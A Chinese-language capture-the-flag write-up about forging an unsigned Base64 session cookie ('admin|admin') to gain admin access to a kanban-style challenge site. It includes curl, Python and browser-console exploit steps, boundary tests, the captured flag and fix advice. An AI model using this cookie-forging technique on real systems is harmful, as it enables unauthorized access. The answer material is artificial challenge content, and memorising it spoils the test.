# 1. 题目分析

题目是一个复古 CRT 风格的"轨道任务板"看板系统，提示明确：

- 访客可用 `guest/guest` 登录
- 卡片可在列间点击流转
- "指挥中心"列有一个**仅限 admin** 的核心指令面板
- 登录后得到的会话 Cookie **完全存于客户端**
- 核心考察点：**认证状态被弱编码进 Cookie，客户端可篡改会话状态**

目标：伪造 admin 身份，访问核心指令接口拿 flag。

初始访问：

```bash
curl -s -i "http://53b3e44c4a9bed4bb9b879b3.http-ctf2.dasctf.com/"
```

关键响应头：

```http
HTTP/1.1 200 OK
Server: openresty
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
```

- `Server: openresty` → Nginx 系，静态资源由 Nginx 直接服务，动态接口交给后端
- 首页无 `Set-Cookie` → 未登录时不下发会话

首页源码里有两处关键信息：

```html
<div id="who">访客</div>
...
<div class="col"><h2>指挥中心 COMMAND</h2>
  <div class="card">核心指令核验 <b>仅限 admin</b></div>
  <div id="adm"></div>
</div>
...
fetch('/me',{credentials:'same-origin'}).then(r=>r.text()).then(t=>{
  document.getElementById('who').textContent='当前身份: '+t;
  if(t.indexOf('admin')>=0){
    document.getElementById('adm').innerHTML=
      '<div class=card>指令核验通过</div><form action=/core method=get><button>读取核心指令</button></form>';
  }
});
```

由此枚举出三个后端接口：

| 接口 | 方法 | 作用 |
|------|------|------|
| `/login` | POST | 登录，下发会话 Cookie |
| `/me` | GET | 返回当前身份（如 `guest [crew]`） |
| `/core` | GET | 核心指令，仅限 admin |
| `/move` | GET | 看板卡片流转 |
| `/logout` | GET | 清除 Cookie |

**推断**：前端 `/me` 的返回值里只要包含 `admin` 就会渲染"读取核心指令"按钮，说明后端把**角色**直接放在 Cookie 里，而且 `/me` 会把角色回显出来——这为后续解码 Cookie 提供了直接线索。

# 2. 信息收集

## 2.1 登录 guest，抓取会话 Cookie

```bash
curl -s -i -c cj.txt -X POST \
  "http://53b3e44c4a9bed4bb9b879b3.http-ctf2.dasctf.com/login" \
  -d "u=guest&p=guest"
```

```http
HTTP/1.1 200 OK
Server: openresty
Content-Type: text/plain; charset=utf-8
Set-Cookie: ORB_SESS=Z3Vlc3R8Y3Jldw==; Path=/; SameSite=Lax
Cache-Control: no-cache

登录成功
```

Cookie 属性值得注意：

- **没有 `HttpOnly`** → JS/客户端可读写
- **没有 `Secure`** → HTTP 明文传输
- **没有签名、没有 `Max-Age`**（会话级）
- 值形如 Base64：`Z3Vlc3R8Y3Jldw==`，结尾 `==` 是标准 Base64 填充

## 2.2 解码 Cookie

```bash
echo "Z3Vlc3R8Y3Jldw==" | base64 -d
# guest|crew
```

结构非常直白：

```
ORB_SESS = base64( 用户名 | 角色 )
           └──────┘ └────┘
            guest    crew
```

## 2.3 用 Cookie 访问 `/me` 与 `/core`

```bash
curl -s -b "ORB_SESS=Z3Vlc3R8Y3Jldw==" .../me
# guest [crew]

curl -s -b "ORB_SESS=Z3Vlc3R8Y3Jldw==" .../core
# 拒绝：核心指令仅限 admin 角色读取。
```

`/me` 的返回 `guest [crew]` **完全对应** `guest|crew` 两个字段，证实：

1. 服务端直接 Base64 解码 Cookie；
2. 按 `|` 切分得到 `用户名` 和 `角色`；
3. 角色被原样回显。

## 2.4 静态资源与 robots.txt（旁路线索）

枚举常见路径时发现 `robots.txt` 存在：

```bash
curl -s -i .../robots.txt
```

```http
HTTP/1.1 200 OK
Content-Length: 46
Last-Modified: Sat, 12 Oct 2019 09:12:40 GMT
Etag: "1570871560.0-46-2906196862"

User-agent: * 
Disallow: /static/secretkey.txt
```

顺着取：

```bash
curl -s .../static/secretkey.txt
# you-will-never-guess
```

得到一个"签名密钥"样子的字符串。但后续验证表明**该 Cookie 并未使用签名**（见 3.2 失败路径），因此这是一个**干扰项/历史遗留文件**。仍然记录，因为它展示了信息收集的完整性。

`/static/` 目录本身返回 404（目录浏览关闭），只有该文件可直读。

## 2.5 其它接口行为基线

| 请求 | 响应 |
|------|------|
| `GET /me`（无 Cookie） | `未登录` |
| `GET /core`（无 Cookie） | `拒绝：核心指令仅限 admin 角色读取。` |
| `GET /core`（guest） | `拒绝：核心指令仅限 admin 角色读取。` |
| `GET /move?task=u1&to=1` | `ok` |
| `GET /logout` | `302 Location: /` + `ORB_SESS=; Max-Age=0` |

`/core` 对"无 Cookie"和"guest"返回相同文案，说明鉴权逻辑只有一条：**取 Cookie 里的角色，比较是否等于 `admin`**。未登录与低权限在此接口上被合并处理。

# 3. 漏洞分析（含推理链和失败路径）

## 3.1 推理链

```
观察：登录响应 Set-Cookie: ORB_SESS=Z3Vlc3R8Y3Jldw==
       且无 HttpOnly / 无签名
  ↓
假设 1：Cookie 是 base64(用户名|角色)
  ↓
验证：base64 -d → guest|crew；/me 回显 guest [crew]
  ↓
结论：认证状态（含角色）以明文 Base64 存储在客户端，服务端无状态、无签名
  ↓
假设 2：把角色改成 admin 即可提权
  ↓
验证：base64("admin|admin") = YWRtaW58YWRtaW4= → /core
  ↓
结果：指挥官核验通过。核心指令: CTF2{...}  ✅
  ↓
结论：越权成功，根因是"信任客户端提交的角色字段"
```

## 3.2 失败路径与边界测试

为了确认鉴权到底校验了什么，做了一组边界实验，结果同样有价值：

| 尝试的 Cookie（解码后） | Base64 | `/core` 结果 | 说明 |
|---|---|---|---|
| 无 Cookie | — | 拒绝 | 基线 |
| `guest\|crew` | `Z3Vlc3R8Y3Jldw==` | 拒绝 | 角色非 admin |
| `admin\|admin` | `YWRtaW58YWRtaW4=` | **成功** | 角色字段为 admin 即放行 |
| `x\|admin` | `eHxhZG1pbg==` | **成功** | 用户名无关，只认角色字段 |
| `\|admin` | `fGFkbWlu` | **成功** | 用户名为空也放行 |
| `admin\|administrator` | `YWRtaW58YWRtaW5pc3RyYXRvcg==` | 拒绝 | 精确匹配，不是前缀/包含 |
| `admin\|root` / `superadmin` / `command` | — | 拒绝 | 角色枚举无效 |
| `admin\|Admin` / `ADMIN` | — | 拒绝 | 大小写敏感 |
| `admin\|admin `（尾空格） | `YWRtaW58YWRtaW4g` | 拒绝 | 未 trim |
| `admin\|` | `YWRtaW58` | 拒绝 | 角色为空 |
| `admin\|admin\|admin` | — | 拒绝 | 按 `\|` 切分后**必须恰好 2 段** |
| `admin\|admin`（去掉 `=` 填充） | `YWRtaW58YWRtaW4` | 拒绝 | 严格标准 Base64 解码，缺填充失败 |

**关键结论**：

1. 授权判定**只依赖 `role` 字段**，与用户名、密码、服务端会话无关；
2. 服务端解析为 `strings.Split(decoded, "|")` 且要求 `len == 2`；
3. 解码器为严格的标准 Base64（`base64.StdEncoding`），填充符 `=` 必须保留；
4. 由于任何形如 `任意|admin` 的值都通过，可以判定**不存在服务端会话表**，也没有把 Cookie 与登录记录绑定——即"完全无状态且无条件信任客户端"。

## 3.3 继续验证签名假设（排除 HMAC）

`secretkey.txt` 的 `you-will-never-guess` 让人怀疑 Cookie 可能带 HMAC 签名。验证：

- `base64("admin|admin|" + signature)` → 三段，被 `len == 2` 检查拒绝；
- 尝试用该 key 对 `admin|admin` 做 HMAC 追加后再编码 → 同样被拒绝；
- 直接把 `secretkey` 当作 admin 密码登录 → `用户名或密码错误`。

因此：**Cookie 无签名机制，secretkey.txt 与本题主链路无关**，属于干扰项（很可能来自靶场模板中的遗留静态文件）。

## 3.4 漏洞原理图解

```
正常登录：
┌──────────────────────────────────────────────────────────┐
│ POST /login  u=guest&p=guest                             │
│        ↓ 服务端查表验证通过                                │
│ Set-Cookie: ORB_SESS = base64("guest|crew")               │
│        ↓                                                  │
│ 浏览器保存 Z3Vlc3R8Y3Jldw==                                │
│        ↓ 后续请求原样回传                                   │
│ 服务端 decode → ["guest","crew"] → role != admin → 拒绝    │
└──────────────────────────────────────────────────────────┘

攻击：客户端直接改写"身份凭证"
┌──────────────────────────────────────────────────────────┐
│ 攻击者本地构造 base64("admin|admin") = YWRtaW58YWRtaW4=     │
│        ↓ 无需任何密码、无需登录                             │
│ GET /core                                                 │
│ Cookie: ORB_SESS=YWRtaW58YWRtaW4=                         │
│        ↓ 服务端 decode → ["admin","admin"]                 │
│ role == "admin" → 放行                                     │
│ 核心指令: CTF2{...}                                        │
└──────────────────────────────────────────────────────────┘
```

本质：**认证状态是客户端可读可写的明文编码，服务端把"用户自称的身份"当作"已认证的身份"**。Base64 只是编码（encoding），不是加密（encryption），更不是签名（signing），不提供任何完整性保护。

# 4. 漏洞利用

## 4.1 一步 PoC

```bash
# 构造 admin Cookie：base64("admin|admin") = YWRtaW58YWRtaW4=
curl -s -b "ORB_SESS=YWRtaW58YWRtaW4=" \
  "http://53b3e44c4a9bed4bb9b879b3.http-ctf2.dasctf.com/core"
```

响应：

```
指挥官核验通过。核心指令: CTF2{c9dd8c25-ef02-45b9-85a5-7e25fff95957}
```

## 4.2 完整复现流程（Python）

```python
import base64, requests

BASE = "http://53b3e44c4a9bed4bb9b879b3.http-ctf2.dasctf.com"

# 1) 正常登录，观察服务端下发的 Cookie 结构
r = requests.post(f"{BASE}/login", data={"u": "guest", "p": "guest"})
raw = r.cookies.get("ORB_SESS")
print("[+] 原始 Cookie:", raw, "->", base64.b64decode(raw).decode())
# guest|crew

# 2) 仅替换角色字段，重新编码
forged = base64.b64encode(b"admin|admin").decode()
print("[+] 伪造 Cookie:", forged)   # YWRtaW58YWRtaW4=

# 3) 带着伪造 Cookie 读取核心指令
r = requests.get(f"{BASE}/core", cookies={"ORB_SESS": forged})
print("[+] /core:", r.text)
```

## 4.3 浏览器端复现

```javascript
// F12 Console
document.cookie = "ORB_SESS=" + btoa("admin|admin") + "; path=/";
location.href = "/core";
```

首页刷新后 `/me` 返回 `admin [admin]`，指挥中心会动态渲染出"读取核心指令"按钮。

# 6. 知识点总结

## 6.1 技术点

| 技术点 | 说明 |
|--------|------|
| Cookie 结构识别 | 值结尾含 `=`、字符集为 `A-Za-z0-9+/` 时优先尝试 Base64 解码 |
| 客户端会话篡改 | Cookie 中直接存放 `用户名\|角色`，无签名 → 任意伪造 |
| 权限判定缺陷 | 仅检查 `role == "admin"`，不校验用户名、不查服务端会话、不验证来源 |
| Base64 ≠ 安全 | 编码可逆，且此处连密钥都没有，属于"可读可写的身份凭证" |
| robots.txt 信息泄露 | 暴露 `/static/secretkey.txt`；本题为干扰项，但流程上必须验证 |
| 解析边界测试 | 填充符、分段数、大小写、空白——用边界确定服务端实现细节 |

## 6.2 修复建议

1. **服务端会话**：Cookie 只存随机 `session_id`，身份与角色保存在服务端（Redis/DB），客户端无法自证身份。
2. **若必须无状态**：使用服务端密钥做 HMAC/JWT 签名，并校验签名、过期时间、签发者；密钥不得放在 Web 可读目录。
3. **Cookie 属性**：`HttpOnly` + `Secure` + `SameSite=Strict`，降低 XSS 窃取与 CSRF 风险。
4. **授权与认证分离**：`/core` 必须做服务端 RBAC 校验，且"未登录"与"权限不足"应区分处理（本题两者混用文案，反而暴露了逻辑简单）。
5. **清理静态目录**：`robots.txt` 不应指向敏感文件；`/static/` 下不得放置密钥、备份、配置。

## 附：失败路径汇总

| 尝试 | 预期 | 实际 | 排除的漏洞 |
|------|------|------|-----------|
| `admin/admin`、`admin/123456`、`root/root` 登录 | 弱口令进后台 | 用户名或密码错误 | 弱口令 |
| 访问 `/flag`、`/flag.txt`、`/admin`、`/source`、`/app.py` | 源码/flag 直接泄露 | 全部 404 | 目录/源码泄露 |
| `admin\|administrator`、`admin\|root` 等角色枚举 | 找到 admin 同义角色 | 全部拒绝 | 角色别名 |
| `admin\|Admin`、`admin\|ADMIN` | 大小写绕过 | 拒绝 | 大小写差异 |
| `admin\|admin `（尾空格）、`admin\|` | 空白/空值绕过 | 拒绝 | 未 trim、空角色 |
| `admin\|admin\|admin` | 多段绕过取第二段 | 拒绝 | 分段数校验规避 |
| 去掉 Base64 `=` 填充 | 宽松解码 | 拒绝 | 非宽松解码器 |
| HMAC 追加签名 + `secretkey` | 若签名可伪造则绕过 | 拒绝；key 作密码也失败 | Cookie 签名机制（不存在） |
| 读取 `/static/` 目录 | 目录浏览找更多文件 | 404 | 目录浏览 |

---

**一句话总结**：把"我是谁"交给客户端说，等于把门禁卡和印章一起发给了访客——Base64 只是把 `guest|crew` 写得更像密码，改一个字符就能坐上指挥席。
